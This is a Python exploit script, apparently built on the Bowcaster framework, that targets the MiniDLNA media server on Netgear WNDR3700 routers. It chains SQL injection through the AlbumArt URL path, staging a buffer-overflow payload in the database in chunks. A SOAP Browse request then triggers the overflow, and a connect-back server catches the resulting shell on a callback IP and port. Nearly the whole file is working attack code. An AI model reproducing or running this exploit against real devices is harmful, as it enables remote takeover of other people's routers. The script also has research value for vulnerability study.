#!/usr/bin/env python

import environment
import math
import sys
import urllib,socket,os,httplib
import time
from bowcaster.common.support import Logging
import WNDR3700versions as WNDR3700
#import WNDR3700alt as WNDR3700

target_ip=environment.TARGET_IP
callback_ip=environment.CALLBACK_IP
callback_port=environment.CALLBACK_PORT

headers={"Host":target_ip}
soap_headers={"Host":target_ip,
                "SOAPACTION":'"urn:schemas-upnp-org:service:ContentDirectory:1#Browse"',
                "content-type":'text/xml ;charset="utf-8"',
                "connection":"close"}


host=target_ip
SLEEP=1


path_beginning='/AlbumArt/1;'
path_ending='-18.jpg'



details_insert_query='insert/**/into/**/DETAILS(ID'+\
                                                ',SIZE'+\
                                                ',TITLE'+\
                                                ',ARTIST'+\
                                                ',ALBUM'+\
                                                ',TRACK'+\
                                                ',DLNA_PN'+\
                                                ',MIME'+\
                                                ',ALBUM_ART'+\
                                                ',DISC)'+\
                                                '/**/VALUES("31337"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"1"'+\
                                                ',"PWNED");'

objects_insert_query='insert/**/into/**/OBJECTS(OBJECT_ID,PARENT_ID,CLASS,DETAIL_ID)'+\
                    '/**/VALUES("PWNED","PWNED","container","31337");'

details_delete_query='delete/**/from/**/DETAILS/**/where/**/ID="31337";'

objects_delete_query='delete/**/from/**/OBJECTS/**/where/**/OBJECT_ID="PWNED";'

def print_progress(bytes_written,total_bytes):
    percent=(bytes_written/float(total_bytes))*100
    marks=int(math.floor(percent / 2))
    dots=50-marks
    markstring="#" * marks
    dotstring="." * dots
    sys.stdout.write("\r[%s%s] %0.2f%%"%(markstring,dotstring,percent))
    sys.stdout.flush()



def build_injection_req(query):
    request=path_beginning+query+path_ending
    return request

def build_soap_request():
    request=""
    f=open("./soaprequest.xml",'r')
    for line in f.readlines():
        request+=line
    f.close()
    return request
def do_post_request(request):
    conn=httplib.HTTPConnection(host,8200,timeout=3)
    conn.request("POST","/ctl/ContentDir",request,soap_headers)
    try:
        resp=conn.getresponse()
        resp_data=resp.read()
    except:
        resp_data=None
    
    conn.close()
    return resp_data

def do_get_request(request):
    conn=httplib.HTTPConnection(host,8200)
    conn.request("GET",request,"",headers)
    conn.close()


def clear_overflow_data():
    logger.log_msg_start("Deleting existing exploit data...")
    request=build_injection_req(details_delete_query)
    do_get_request(request)
    request=build_injection_req(objects_delete_query)
    do_get_request(request)
    time.sleep(SLEEP*5)
    logger.log_msg_end("done.")

def stage_data(data):
    totalbytes=0
    sent=0
    for string in data:
        totalbytes+=len(string)

    print_progress(sent,totalbytes)
    for string in data:
        details_update_query='update/**/DETAILS/**/set/**/ALBUM_ART=ALBUM_ART||"'+\
                string+'"/**/where/**/ID="31337";'
    
        request=build_injection_req(details_update_query)
        do_get_request(request)
        sent+=len(string)
        print_progress(sent,totalbytes)
        time.sleep(SLEEP*0.5)

def insert_overflow_data(overflow_data):
    logger.log_msg_start("Setting up initial database records....")
    request=build_injection_req(objects_insert_query)
    do_get_request(request)
    request=build_injection_req(details_insert_query)
    do_get_request(request)
    logger.log_msg_end("done.")
    

    logger.log_msg("Staging overflow....")
    logger.log_msg("%d sections" % len(overflow_data))
    stage_data(overflow_data)
    logger.log_msg_end("\n\t....done.")


def trigger_exploit():
    request=build_soap_request()
    resp=do_post_request(request)
    if resp==None:
        return
    else:
        raise Exception("Exploit failed.")


logger=Logging()

WNDR3700_class=WNDR3700.WNDR3700_version_detect(target_ip,logger=logger)

if len(sys.argv) > 1 and sys.argv[1].startswith('find='):
    find=sys.argv[1].split('=')[1]

    found=WNDR3700_class(callback_ip,callback_port,target_ip,encode=True,logger=logger).find(find)
    logger.LOG_INFO("found string %s at offset %d" % (find,found))
    sys.exit(0)
"""
try:
    dlna_overflow=WNDR3700_class(callback_ip,callback_port,target_ip,encode=True,logger=logger)
except Exception as e:
    print str(e)
    sys.exit(1)
"""
dlna_overflow=WNDR3700_class(callback_ip,callback_port,target_ip,encode=True,logger=logger)

dlna_overflow.overflow_data.print_section_descriptions()

null_offsets=dlna_overflow.scan_for_nulls()

if len(null_offsets) !=0:
    logger.LOG_WARN("found null bytes at offsets: %s" % str(null_offsets))
    print str(dlna_overflow.overflow_data)
    exit(1)
else:
    logger.LOG_INFO("found no null bytes.")

clear_overflow_data()

insert_overflow_data(dlna_overflow.chunks(128))

server=dlna_overflow.connectback_server
server.serve()

time.sleep(2)
logger.log_msg_start("Attempting to trigger exploit....")
logger.log_msg_end("Have a nice day!")
try:
    trigger_exploit()
    
except:
        logger.log_msg_end("FAILED.")
        server.shutdown()
server.wait()
